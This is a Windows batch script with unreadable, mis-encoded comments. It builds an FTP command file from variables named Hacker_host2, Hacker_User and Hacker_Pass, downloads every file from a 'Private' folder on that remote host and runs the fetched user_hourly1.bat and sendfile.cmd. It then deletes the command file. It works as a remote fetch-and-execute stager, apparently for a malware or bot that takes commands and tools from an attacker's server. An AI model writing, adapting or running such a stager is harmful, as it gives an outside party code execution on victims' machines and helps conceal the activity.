@echo off
rem �������� Windows, ���������� ������ ��� � ��� ����� ������������ � �������
rem ������ ��� ������� ������ ������ ������� ��������, ����� ������ ������ �� ��������.
rem ��� ������ �������� ����� ������������ �����, ������� ����� ������� 
rem ������ ��� ����������� ������ ��������,
rem � ���� ���������� �����, ������� �������� �� ������� � ������� �������� � �������
rem ����� ������.

Rem !!! ������������ ����� ������� 1

rem ��������� ���������������� �����, ����������� ��� ������������

::��������� ���� ������ ��� ������� FTP.exe
set CommFTP="%PUB1%\Initial_Script.txt"

rem ��������� � ��������� �������
C:
cd %PUB1%

rem ���������� ����������:
rem FTP Host
set host=%Hacker_host2%
rem FTP Port
set port=%Hacker_port%
rem Ftp User
set user=%Hacker_User%
rem FTP Password
set password=%Hacker_Pass%
rem �������� �����
set Mainfolder=
rem ����� ������ FTP ������
set SubFolder=Private
rem ����� ������ FTP ������
set SubFolder1=
rem ����� ��� ������
set fileMask=*
rem ��������� �������
set LocalFolderU=%PUB1%\Util
 
 
::���������� ���� FTP ������
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolderU%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::��������� �� ���������� �������� ������ FTP

ftp.exe -s:%CommFTP%

::������� ��������
del /f /q %CommFTP%

REM !!! ����� ������������ ����� 1 !!!
REM ������������ ����� 2. ���� ����� ��������� ������������ ���������������� ���������

call "%PUB1%\Util\user_hourly1.bat"

REM !!! ������������ ����� 3 !!!
rem �������� ����������� ������ ������� �������
rem ���� sendfile.cmd ����� ���������� � ������ �����

call "%PUB1%\Util\sendfile.cmd"

REM ����� �������
